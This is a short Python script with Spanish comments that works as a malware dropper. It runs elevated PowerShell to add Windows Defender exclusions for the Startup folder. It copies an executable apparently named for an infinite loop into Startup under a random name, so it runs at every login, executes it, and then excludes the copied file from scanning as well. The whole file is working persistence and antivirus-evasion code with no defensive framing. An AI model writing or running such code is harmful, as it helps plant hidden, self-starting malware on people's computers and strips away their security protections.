import shutil
import subprocess
import os
import random
import string

archivo_origen = 'bucle_infinito_v2.exe'
command1 = f"Add-MpPreference -ExclusionPath 'C:\\Users\\{os.getlogin()}\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup'"
cmd1 = ["powershell", "Start-Process", "powershell", "-Verb", "RunAs", "-ArgumentList", command1]
subprocess.run(cmd1)


# Generate a random string of length 8
random_string = ''.join(random.choices(string.ascii_lowercase + string.digits, k=8))
nombre_archivo_destino = f'il{random_string}.exe'

def copiar_y_ejecutar(archivo_origen, nombre_archivo_destino):
    # Obtener la ruta del escritorio del usuario
    # escritorio = os.path.join(os.path.expanduser('~'), 'Desktop')
    # Obtener la ruta de startup
    startup = os.path.join(os.path.expanduser('~'), 'AppData', 'Roaming', 'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Startup')

    # Ruta completa del destino
    # destino = os.path.join(escritorio, nombre_archivo_destino)
    destino2 = os.path.join(startup, nombre_archivo_destino)

    try:
        # Copiar el archivo
        # shutil.copy(archivo_origen, destino)
        shutil.copy(archivo_origen, destino2)

        # print(f"Archivo copiado a {destino}")
        print(f"Archivo copiado a {destino2}")

        # Ejecutar el archivo ejecutable
        subprocess.run([destino2])

    except Exception as e:
        print(f"Ocurrió un error: {e}")

copiar_y_ejecutar(archivo_origen, nombre_archivo_destino)

command2 = f"Add-MpPreference -ExclusionPath 'C:\\Users\\{os.getlogin()}\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\{nombre_archivo_destino}'"
cmd2 = ["powershell", "Start-Process", "powershell", "-Verb", "RunAs", "-ArgumentList", command2]
subprocess.run(cmd2)

